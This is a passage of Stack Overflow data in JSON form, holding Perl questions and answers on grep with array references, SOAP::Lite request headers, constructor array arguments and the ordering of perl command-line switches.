<code>@lista</code> has one element which is an arrayref, as explained in ikegami&#39;s answer. That is duly not equal to <code>&#39;KITE&#39;</code> and so the condition in <code>grep</code> block is true, and that element passes. So <code>@listb</code> contains that one element, a reference that was assigned to <code>@lista</code>. This isn&#39;t what you want of course, but <code>print Dump(\\@listb)</code> should print."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 11, "last_activity_date": 1494695092, "last_edit_date": 1494695092, "creation_date": 1494623864, "answer_id": 43946613, "question_id": 43946547, "link": "https://stackoverflow.com/questions/43946547/why-grep-doesnt-work-on-lists-in-perl/43946613#43946613", "title": "Why grep doesn&#39;t work on lists in perl", "body": "<p><code>[]</code> doesn't return an array; it returns a reference to an array. A such, <code>@lista</code> only contains one element. You are comparing the stringification of that reference (something like <code>ARRAY(0x61dc18)</code>) with <code>KITE</code>. Seeing as those two strings are completely different, <code>grep</code> returns the reference and you store it in <code>@listb</code>.</p>\n\n<p>I think you want the following:</p>\n\n<pre><code>my $array_a = ['THE', 'KITE', 'RUNNER'];\nmy @array_b = grep { $_ ne 'KITE' } @$array_a;\nprint Data::Dumper-&gt;Dump(\\@array_b);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1652, "user_id": 4414367, "user_type": "registered", "accept_rate": 62, "profile_image": "https://lh3.googleusercontent.com/-l6uq-uiBGvg/AAAAAAAAAAI/AAAAAAAAAVA/F0AWblrmSTM/photo.jpg?sz=128", "display_name": "Kamal Nayan", "link": "https://stackoverflow.com/users/4414367/kamal-nayan"}, "is_accepted": false, "score": 0, "last_activity_date": 1494783312, "creation_date": 1494783312, "answer_id": 43966946, "question_id": 43946547, "link": "https://stackoverflow.com/questions/43946547/why-grep-doesnt-work-on-lists-in-perl/43966946#43966946", "title": "Why grep doesn&#39;t work on lists in perl", "body": "<p><code>grep</code> works on array, but <code>[]</code> returns an arrayref. To use an array, use <code>()</code> instead. <br> Here are two alternates to your program:</p>\n\n<pre><code>use Data::Dumper;\nmy $lista = ['THE', 'KITE', 'RUNNER'];\nmy @listb = grep { $_ ne 'KITE' } @$lista;\nprint Dumper \\@listb;\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>use Data::Dumper;\nmy @lista = ('THE', 'KITE', 'RUNNER'); \nmy @listb = grep { $_ ne 'KITE' } @lista;\nprint Dumper \\@listb;\n</code></pre>\n"}], "owner": {"reputation": 90, "user_id": 2648578, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/t3Ouk.jpg?s=128&g=1", "display_name": "Satyasheel", "link": "https://stackoverflow.com/users/2648578/satyasheel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1494783312, "creation_date": 1494623570, "last_edit_date": 1494623966, "question_id": 43946547, "link": "https://stackoverflow.com/questions/43946547/why-grep-doesnt-work-on-lists-in-perl", "title": "Why grep doesn&#39;t work on lists in perl", "body": "<p>In Perl, </p>\n\n<pre><code>my @lista = ['THE', 'KITE', 'RUNNER'];\nmy @listb = grep { $_ ne 'KITE' } @lista;\nprint \"\" . Data::Dumper-&gt;Dump(\\@listb);\n</code></pre>\n\n<p>prints nothing while</p>\n\n<pre><code>my @lista = ('THE', 'KITE', 'RUNNER');\nmy @listb = grep { $_ ne 'KITE' } @lista;\nprint \"\" . Data::Dumper-&gt;Dump(\\@listb);\n</code></pre>\n\n<p>prints an array containing 'THE' 'RUNNER'.</p>\n\n<p>Why grep doesn't work when array is defined within <code>[]</code>?</p>\n\n<p>How to do grep operations on an array defined in <code>[]</code>?</p>\n"}, {"tags": ["perl", "soap", "soaplite"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494669704, "post_id": 43943952, "comment_id": 74935107, "body": "If you have a wsdl file, try with XML::Compile. It allows you to use the wsdl to generate the correct messages automatically. But it does get tricky sometimes."}, {"owner": {"reputation": 93, "user_id": 607469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4d3ccb20a05ddeca11dbdc3774eb730?s=128&d=identicon&r=PG", "display_name": "ShinobiDev", "link": "https://stackoverflow.com/users/607469/shinobidev"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494693794, "post_id": 43943952, "comment_id": 74942329, "body": "Please read my question. I know the correct format for the request, I just can&#39;t figure out how to send it using SOAP::Lite."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494694072, "post_id": 43943952, "comment_id": 74942401, "body": "I have read your question, that&#39;s why I am suggesting an alternative. Playing around with SOAP::Lite is frustrating. Give <a href=\"https://metacpan.org/pod/distribution/XML-Compile-SOAP/lib/XML/Compile/SOAP.pod\" rel=\"nofollow noreferrer\">metacpan.org/pod/distribution/XML-Compile-SOAP/lib/XML/Compi&zwnj;&#8203;le/&hellip;</a> a try and you&#39;ll see it will probably handle the namespaces and attributes better."}], "answers": [{"comments": [{"owner": {"reputation": 93, "user_id": 607469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4d3ccb20a05ddeca11dbdc3774eb730?s=128&d=identicon&r=PG", "display_name": "ShinobiDev", "link": "https://stackoverflow.com/users/607469/shinobidev"}, "edited": false, "score": 0, "creation_date": 1495483071, "post_id": 44115342, "comment_id": 75261601, "body": "This is what I was trying to do but I couldn&#39;t figure out how to assign attributes to the header elements.  The last thing I am having trouble with is how to work in the &quot;SecurityMessageHeader&quot; and &quot;SequenceMessageHeader&quot; sections without breaking out of the header block. Any ideas for this?"}, {"owner": {"reputation": 41, "user_id": 5435872, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16a6106925371c3e549175e6e99a5436?s=128&d=identicon&r=PG&f=1", "display_name": "rahed h", "link": "https://stackoverflow.com/users/5435872/rahed-h"}, "reply_to_user": {"reputation": 93, "user_id": 607469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4d3ccb20a05ddeca11dbdc3774eb730?s=128&d=identicon&r=PG", "display_name": "ShinobiDev", "link": "https://stackoverflow.com/users/607469/shinobidev"}, "edited": false, "score": 0, "creation_date": 1495547495, "post_id": 44115342, "comment_id": 75292036, "body": "Look at <a href=\"http://www.wlp-systems.de/soap-lite-and-ws-security.html\" rel=\"nofollow noreferrer\">wlp-systems.de/soap-lite-and-ws-security.html</a> or google for it. I used it with SOAP::Lite."}], "tags": [], "owner": {"reputation": 41, "user_id": 5435872, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/16a6106925371c3e549175e6e99a5436?s=128&d=identicon&r=PG&f=1", "display_name": "rahed h", "link": "https://stackoverflow.com/users/5435872/rahed-h"}, "is_accepted": false, "score": 1, "last_activity_date": 1495462933, "creation_date": 1495462933, "answer_id": 44115342, "question_id": 43943952, "link": "https://stackoverflow.com/questions/43943952/sending-very-specific-soaplite-requests/44115342#44115342", "title": "Sending Very Specific SOAP::Lite requests", "body": "<p>This should generate the required response using SOAP::Lite request.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse SOAP::Lite +trace=&gt;'all';\n\n$on_action = '';\n$proxy = 'http://serviceURL';\n\n$soap = SOAP::Lite-&gt;new(proxy =&gt; $proxy);\n$soap-&gt;on_action(sub {$on_action});\n$soap-&gt;readable(1);\n$soap-&gt;autotype(0);\n$soap-&gt;serializer-&gt;register_ns('http://mycompany.com/InquireEnterpriseOrderDataRequest.xsd' =&gt; 'xsi');\n$soap-&gt;serializer-&gt;register_ns('http://mycompany.com/InquireEnterpriseOrderDataRequest.xsd' =&gt; 'xsi:schemaLocation');\n$soap-&gt;default_ns('http://mycompany.com/InquireEnterpriseOrderDataRequest.xsd');\n$soap-&gt;envprefix('SOAP-ENV');\n\n$sheader = SOAP::Header-&gt;name(MessageHeader =&gt;\\SOAP::Header-&gt;value(SOAP::Header-&gt;name(TrackingMessageHeader =&gt; \\SOAP::Header-&gt;value(\n               SOAP::Header-&gt;name(version =&gt; 111),\n               SOAP::Header-&gt;name(originalVersion =&gt; ''),\n               SOAP::Header-&gt;name(messageId =&gt; ''),\n               SOAP::Header-&gt;name(originatorId =&gt; 'ABC'),\n               SOAP::Header-&gt;name(responseTo =&gt; ''),\n               SOAP::Header-&gt;name(returnURL =&gt; ''),\n               SOAP::Header-&gt;name(timetoLive =&gt; 360000),\n               SOAP::Header-&gt;name(conversationId =&gt; '9AF0E9281A524262980F5284F4C57888_CCE423E277C74FA9A84D2155CD612EB3_0'),\n               SOAP::Header-&gt;name(routingRegionOverride =&gt; ''),\n               SOAP::Header-&gt;name(dateTimeStamp =&gt; '2017-04-11T18:47:53Z'),\n               SOAP::Header-&gt;name(timetoLive =&gt; 'mytransid'),\n            ))-&gt;prefix('ns2')))-&gt;attr({'xmlns:ns2' =&gt; 'http://mycompany.com/MessageHeader.xsd',xmlns =&gt; 'http://mycompany.com/CingularDataModel.xsd'})-&gt;prefix('ns2');\n\npush @request,(\n        SOAP::Data-&gt;name(OrderSearchCriteria =&gt; \\SOAP::Data-&gt;value(\n           SOAP::Data-&gt;name(OrderDetails =&gt; \\SOAP::Data-&gt;value(\n              SOAP::Data-&gt;name(SearchByOrderAction =&gt; \\SOAP::Data-&gt;value(\n                 SOAP::Data-&gt;name(orderActionNumber =&gt; 12345654),\n                 SOAP::Data-&gt;name(orderActionVersion =&gt; 1),\n)))))));\n$reply = $soap-&gt;InquireEnterpriseOrderDataRequest($sheader,@request);\n</code></pre>\n"}], "owner": {"reputation": 93, "user_id": 607469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4d3ccb20a05ddeca11dbdc3774eb730?s=128&d=identicon&r=PG", "display_name": "ShinobiDev", "link": "https://stackoverflow.com/users/607469/shinobidev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 430, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1495462933, "creation_date": 1494612198, "question_id": 43943952, "link": "https://stackoverflow.com/questions/43943952/sending-very-specific-soaplite-requests", "title": "Sending Very Specific SOAP::Lite requests", "body": "<p>My company uses has a lot of internal APIs that use very specific header and formatting requirements. I am new to SOAP::Lite and I'm trying to make it work within the company's framework. </p>\n\n<p><strong>Try #1:</strong>\nIdeally, I would like to be able to just take the raw XML template (see bottom of the post), populate some placeholder variables, and send it to the endpoint using the following code:</p>\n\n<pre><code>my $client = SOAP::Lite-&gt;new( proxy =&gt; \"$serviceURL\");\nmy $reply = $client-&gt;InquireEnterpriseOrderDataRequest($rawxml);\n</code></pre>\n\n<p>However, this results in my header and request sections being enclosed in it's own \"envelope\", \"body\" and \"InquireEnterpriseOrderDataRequest\" which is rejected by the service.</p>\n\n<p><strong>Try #2:</strong>\nThe next thing I tried was to break my request into two pieces: header and request and use <code>SOAP::Data</code> and <code>SOAP::Header</code> to send those:</p>\n\n<pre><code>my $rawxmlheader = '&lt;ns2:MessageHeader xmlns:ns2=\"http://mycompany.com/MessageHeader.xsd\" xmlns=\"http://mycompany.com/CingularDataModel.xsd\"&gt;\n &lt;ns2:TrackingMessageHeader&gt;\n    &lt;version&gt;111&lt;/version&gt;\n    &lt;originalVersion/&gt;\n    &lt;messageId/&gt;\n    &lt;originatorId&gt;ABC&lt;/originatorId&gt;\n    &lt;responseTo/&gt;\n    &lt;returnURL/&gt;\n    &lt;timeToLive&gt;360000&lt;/timeToLive&gt;\n    &lt;conversationId&gt;9AF0E9281A524262980F5284F4C57888_CCE423E277C74FA9A84D2155CD612EB3_0&lt;/conversationId&gt;\n    &lt;routingRegionOverride/&gt;\n    &lt;dateTimeStamp&gt;2017-05-12T12:47:53Z&lt;/dateTimeStamp&gt;\n    &lt;uniqueTransactionId&gt;mytransid&lt;/uniqueTransactionId&gt;\n &lt;/ns2:TrackingMessageHeader&gt;\n &lt;ns2:SecurityMessageHeader&gt;\n    &lt;userName&gt;myusername&lt;/userName&gt;\n    &lt;userPassword&gt;mypass&lt;/userPassword&gt;\n &lt;/ns2:SecurityMessageHeader&gt;\n &lt;ns2:SequenceMessageHeader&gt;\n    &lt;sequenceNumber/&gt;\n    &lt;totalInSequence/&gt;\n &lt;/ns2:SequenceMessageHeader&gt;\n&lt;/ns2:MessageHeader&gt;';\n\nmy $rawxmlrequest = '&lt;OrderSearchCriteria&gt;\n    &lt;OrderDetails&gt;\n       &lt;SearchByOrderAction&gt;\n      &lt;orderActionNumber&gt;12345654&lt;/orderActionNumber&gt;\n      &lt;orderActionVersion&gt;1&lt;/orderActionVersion&gt;\n       &lt;/SearchByOrderAction&gt;\n    &lt;/OrderDetails&gt;\n &lt;/OrderSearchCriteria&gt;\n &lt;provisioningDetailsIndicator&gt;true&lt;/provisioningDetailsIndicator&gt;';\n\n    my $client = SOAP::Lite-&gt;new( proxy =&gt; \"$serviceURL\");\n    my $header = SOAP::Header-&gt;type('xml' =&gt; $rawxmlheader);\n    my $elem = SOAP::Data-&gt;type('xml' =&gt; $rawxmlrequest);\n    my @arguments;\n    push(@arguments, $header);\n    push(@arguments, $elem);\n    my $reply = $client-&gt;InquireEnterpriseOrderDataRequest(@arguments);\n</code></pre>\n\n<p>This produced a very similar request to what was needed with the exception that the InquireEnterpriseOrderDataRequest blob did not contain the xsi:schemaLocation, xmlns or xmlns:xsi values that seem to be required.</p>\n\n<p><strong>Try #3:</strong>\nNow I was grasping at straws, so I also tried to granularly create my own XML using something like this:</p>\n\n<pre><code>my $temp_elements = \n        SOAP::Data-&gt;name(\"OrderSearchCriteria\" =&gt; \\SOAP::Data-&gt;value(\n        SOAP::Data-&gt;name(\"OrderDetails\" =&gt; \\SOAP::Data-&gt;value(\n        SOAP::Data-&gt;name(\"SearchByOrderAction\" =&gt; \\SOAP::Data-&gt;value(\n        SOAP::Data-&gt;name(\"orderActionNumber\" =&gt; '301496944'),\n        SOAP::Data-&gt;name(\"orderActionVersion\" =&gt; '3')\n        )\n        )\n    )\n    ))\n        )-&gt;type(\"SomeObject\");\n\nmy $client = SOAP::Lite-&gt;new( proxy =&gt; \"$serviceURL\");\nmy $reply = $client-&gt;InquireEnterpriseOrderDataRequest($temp_elements);\n</code></pre>\n\n<p>The problem here was that I don't know how to include the xsi:schemaLocation, xmlns and xmlns:xsi values or prepend the header information.</p>\n\n<p>Of course, I'd like to go with the simplest possible implementation but any suggestions are appreciated! Thanks in advance!</p>\n\n<p><strong>Required request format:</strong></p>\n\n<pre><code>&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;\n   &lt;SOAP-ENV:Header&gt;\n      &lt;ns2:MessageHeader xmlns:ns2=\"http://mycompany.com/MessageHeader.xsd\" xmlns=\"http://mycompany.com/CingularDataModel.xsd\"&gt;\n         &lt;ns2:TrackingMessageHeader&gt;\n            &lt;version&gt;111&lt;/version&gt;\n            &lt;originalVersion/&gt;\n            &lt;messageId/&gt;\n            &lt;originatorId&gt;ABC&lt;/originatorId&gt;\n            &lt;responseTo/&gt;\n            &lt;returnURL/&gt;\n            &lt;timeToLive&gt;360000&lt;/timeToLive&gt;\n            &lt;conversationId&gt;9AF0E9281A524262980F5284F4C57888_CCE423E277C74FA9A84D2155CD612EB3_0&lt;/conversationId&gt;\n            &lt;routingRegionOverride/&gt;\n            &lt;dateTimeStamp&gt;2017-04-11T18:47:53Z&lt;/dateTimeStamp&gt;\n            &lt;uniqueTransactionId&gt;mytransid&lt;/uniqueTransactionId&gt;\n         &lt;/ns2:TrackingMessageHeader&gt;\n         &lt;ns2:SecurityMessageHeader&gt;\n            &lt;userName&gt;myusername&lt;/userName&gt;\n            &lt;userPassword&gt;mypass&lt;/userPassword&gt;\n         &lt;/ns2:SecurityMessageHeader&gt;\n         &lt;ns2:SequenceMessageHeader&gt;\n            &lt;sequenceNumber/&gt;\n            &lt;totalInSequence/&gt;\n         &lt;/ns2:SequenceMessageHeader&gt;\n      &lt;/ns2:MessageHeader&gt;\n   &lt;/SOAP-ENV:Header&gt;\n  &lt;SOAP-ENV:Body&gt;\n      &lt;InquireEnterpriseOrderDataRequest xsi:schemaLocation=\"http://mycompany.com/InquireEnterpriseOrderDataRequest.xsd\" xmlns=\"http://mycompany.com/InquireEnterpriseOrderDataRequest.xsd\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;\n         &lt;OrderSearchCriteria&gt;\n            &lt;OrderDetails&gt;\n               &lt;SearchByOrderAction&gt;\n                  &lt;orderActionNumber&gt;12345654&lt;/orderActionNumber&gt;\n                  &lt;orderActionVersion&gt;1&lt;/orderActionVersion&gt;\n               &lt;/SearchByOrderAction&gt;\n            &lt;/OrderDetails&gt;\n         &lt;/OrderSearchCriteria&gt;\n         &lt;provisioningDetailsIndicator&gt;true&lt;/provisioningDetailsIndicator&gt;\n      &lt;/InquireEnterpriseOrderDataRequest&gt;\n   &lt;/SOAP-ENV:Body&gt;\n&lt;/SOAP-ENV:Envelope&gt;\n</code></pre>\n"}, {"tags": ["arrays", "perl", "constructor"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494615093, "post_id": 43943591, "comment_id": 74922063, "body": "Especially when using object-oriented Perl, you <b><i>must always</i></b> <code>use strict</code> and <code>use warnings &#39;all&#39;</code> at the top of every Perl source file, and declare each variable using <code>my</code>."}], "answers": [{"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 3, "last_activity_date": 1494611033, "creation_date": 1494611033, "answer_id": 43943646, "question_id": 43943591, "link": "https://stackoverflow.com/questions/43943591/input-array-in-constructor-perl/43943646#43943646", "title": "Input array in constructor - Perl", "body": "<p>If you want to specify domains as a list, you need to do this:</p>\n\n<pre><code>sub new {\n   $class = shift;\n   $self = {\n     server =&gt; shift,\n     type =&gt; shift,\n     domains =&gt; [ @_ ],\n   };\n   bless $self, $class;\n   return $self;\n}\n</code></pre>\n\n<p>That's because hashes cannot have non-scalar keys or values.</p>\n\n<p>Either way, you are going to have to dereference that array ref when iterating through domains:</p>\n\n<pre><code>for my $domain (@{ $self-&gt;{domains} }){\n     print \"$domain\\n\";\n }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1019, "user_id": 2730331, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/ff73fdc2c4b7f1600823fb392a0ff36b?s=128&d=identicon&r=PG", "display_name": "user081608", "link": "https://stackoverflow.com/users/2730331/user081608"}, "edited": false, "score": 0, "creation_date": 1494948422, "post_id": 43943774, "comment_id": 75039461, "body": "Hey zdim, would i still need to include <code>bless $self, $class;</code> and <code>return $self;</code> after I set <code>my $self = {...}</code> ?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 1019, "user_id": 2730331, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/ff73fdc2c4b7f1600823fb392a0ff36b?s=128&d=identicon&r=PG", "display_name": "user081608", "link": "https://stackoverflow.com/users/2730331/user081608"}, "edited": false, "score": 0, "creation_date": 1494955191, "post_id": 43943774, "comment_id": 75043726, "body": "@user081608  Yes, by all means.  Setting <code>$self</code> merely populates a hashref in the program.  It is the <code>bless</code>-ing that makes <code>$self</code> an object of <code>$class</code>, and after that line <code>$self</code> &quot;knows&quot; what class it belongs to, you can call methods on it, etc. While <code>return</code>ing it is important for all kinds of uses.  I&#39;ve added that for completeness, thank you for asking."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 5, "last_activity_date": 1500971764, "last_edit_date": 1500971764, "creation_date": 1494611477, "answer_id": 43943774, "question_id": 43943591, "link": "https://stackoverflow.com/questions/43943591/input-array-in-constructor-perl/43943774#43943774", "title": "Input array in constructor - Perl", "body": "<p>Arguments are passed to a function as a list of scalars, and your first invocation is just</p>\n\n<pre><code>my $var = new class(\"server\",1,1,2,3);\n</code></pre>\n\n<p>A hash value need be a scalar, so you need an anonymous array there</p>\n\n<pre><code>domains =&gt; [ LIST ];\n</code></pre>\n\n<p>So either </p>\n\n<ul>\n<li><p><code>shift</code> off all single options as you do and then copy the rest into the arrayref</p>\n\n<pre><code>domains =&gt; [ @_ ];\n</code></pre></li>\n<li><p>or pass an arrayref, which is a scalar, like in your second invocation and assign it</p>\n\n<pre><code>domains =&gt; shift;\n</code></pre></li>\n</ul>\n\n<p>In both cases the <code>$self-&gt;{domains}</code> is going to be an arrayref.</p>\n\n<p>On the other hand, consider nicely assigning arguments first</p>\n\n<pre><code>sub new { \n    my ($class, $server, $type, @domains) = @_;\n    # ...\n    my $self = { \n        # ...\n        domains =&gt; \\@domains\n    };\n    return bless $self, $class;\n}\n</code></pre>\n\n<p>for the first invocation, or </p>\n\n<pre><code>sub new {\n    my ($class, $server, $type, $rdomains) = @_;\n    my $self = {\n        # ...\n        domains =&gt; $rdomains\n    };\n    return bless $self, $class;\n}\n</code></pre>\n\n<p>for the second one. Since <a href=\"http://perldoc.perl.org/functions/bless.html\" rel=\"nofollow noreferrer\">bless</a> returns its first argument we can directly <code>return</code> (for brevity).</p>\n\n<p>Finally, you use the <a href=\"http://perldoc.perl.org/perlobj.html#Invoking-Class-Methods\" rel=\"nofollow noreferrer\">indirect object notation</a> for calling the constructor.  In short, don't -- use</p>\n\n<pre><code>my $object = ClassName-&gt;new( ARGS );\n</code></pre>\n\n<p>See the link above for an official statement, and <a href=\"https://stackoverflow.com/questions/32955172/what-is-indirect-object-notation-why-is-it-bad-and-how-does-one-avoid-it\">this post</a></p>\n\n<hr>\n\n<p>Please <em>always</em> run with <a href=\"http://perldoc.perl.org/warnings.html\" rel=\"nofollow noreferrer\">warnings</a>, as that saves a lot of headaches. I also strongly suggest to always use <a href=\"http://perldoc.perl.org/strict.html\" rel=\"nofollow noreferrer\">strict</a> as it promotes all manner of good practices</p>\n\n<pre><code># At the beginning of every program\nuse warnings 'all';\nuse strict;\n</code></pre>\n"}], "owner": {"reputation": 1019, "user_id": 2730331, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/ff73fdc2c4b7f1600823fb392a0ff36b?s=128&d=identicon&r=PG", "display_name": "user081608", "link": "https://stackoverflow.com/users/2730331/user081608"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 316, "favorite_count": 0, "accepted_answer_id": 43943774, "answer_count": 2, "score": 1, "last_activity_date": 1500971764, "creation_date": 1494610858, "question_id": 43943591, "link": "https://stackoverflow.com/questions/43943591/input-array-in-constructor-perl", "title": "Input array in constructor - Perl", "body": "<p>I am currently creating a class in Perl that looks like this:</p>\n\n<pre><code>sub new{\n   $class = shift;\n   $self = {\n     #Member Variables\n     server =&gt; shift,\n     type =&gt; shift,\n     domains =&gt; shift\n   };\n   bless $self, $class;\n   return $self;\n}\n</code></pre>\n\n<p>I want the domains to be an array with multiple variables. How would I differentiate an array from a normal variable when using shift? I am trying to input the array like this:</p>\n\n<pre><code> my $var = new class(\"server\",1,(1,2,3));\n my $var = new class(\"server\",1,[1,2,3]);\n</code></pre>\n\n<p>Neither of these work when trying to iterate through the array doing:</p>\n\n<pre><code> for $i ($self-&gt;{domains}){\n     print \"$i\\n\";\n }\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1494610269, "post_id": 43943302, "comment_id": 74919368, "body": "<code>-pie</code> shouldn&#39;t work."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 5, "creation_date": 1494610295, "post_id": 43943302, "comment_id": 74919381, "body": "<code>perl -0 -pie</code> means <code>perl -0 -p -i e</code>, i.e. the extension <code>e</code> for the backup. <code>perl -i -p0e</code> instead means <code>perl -i -p -0 -e</code>, i.e. no backup since the optional argument to <code>-i</code> is missing."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1494610380, "post_id": 43943302, "comment_id": 74919428, "body": "I always give <code>-i</code> separately, and <code>-0</code> as well (which should be <code>-0777</code>)."}, {"owner": {"reputation": 3127, "user_id": 266309, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7e67bba1d7db144687d2093e7fb201b4?s=128&d=identicon&r=PG", "display_name": "waldyrious", "link": "https://stackoverflow.com/users/266309/waldyrious"}, "edited": false, "score": 0, "creation_date": 1494610560, "post_id": 43943302, "comment_id": 74919528, "body": "Oh, wow. I&#39;m embarrassed -- I was quite sure <code>perl -pie</code> did work, but indeed it errors the same way. I must have mistaken the mnemonic for the actual command :/"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1494611345, "post_id": 43943302, "comment_id": 74920025, "body": "@Steffen Ullrich, Not quite. <code>-ie</code> can&#39;t be written as <code>-i e</code>."}], "answers": [{"comments": [{"owner": {"reputation": 3127, "user_id": 266309, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7e67bba1d7db144687d2093e7fb201b4?s=128&d=identicon&r=PG", "display_name": "waldyrious", "link": "https://stackoverflow.com/users/266309/waldyrious"}, "edited": false, "score": 0, "creation_date": 1494613685, "post_id": 43943636, "comment_id": 74921335, "body": "You&#39;re right -- the <code>-pie</code> option did not work, as the comments above made me realize, and I was considering deleting this question as it was clearly misguided. But since you took the time to write an answer (and a quite informative one at that), I&#39;ll accept it instead. Thanks!"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 7, "last_activity_date": 1494611776, "last_edit_date": 1494611776, "creation_date": 1494611008, "answer_id": 43943636, "question_id": 43943302, "link": "https://stackoverflow.com/questions/43943302/why-does-perl-i-p0e-expression-work-but-not-perl-0-pie-expression/43943636#43943636", "title": "Why does `perl -i -p0e &lt;expression&gt;` work, but not `perl -0 -pie &lt;expression&gt;`?", "body": "<ul>\n<li><code>-i</code> means work in-place without backup.</li>\n<li><code>-ie</code> means work in-place, with backup. The backup has the same name as the original file, but with <code>e</code> appended.</li>\n</ul>\n\n<p>That means that <code>perl -pie 's/foo/bar/' file.txt</code> didn't work either (unless you have a Perl file named <code>s/foo/bar/</code>).</p>\n\n<p>If you simply arrange the options logically, you avoid the problem. <code>-i</code> has nothing to do with the program &mdash;it'll still work if added/removed&mdash; so it makes more sense to place it first anyway. <code>-p</code> and <code>-0777</code>, otoh, are part of the program, so it makes sense to place them next to <code>-e</code>. So writing the command sensibly results in one of the following:</p>\n\n<pre><code>perl -i  -0777pe'...' ...\nperl -i~ -0777pe'...' ...\nperl     -0777pe'...' ...\n</code></pre>\n\n<p>Note that I used 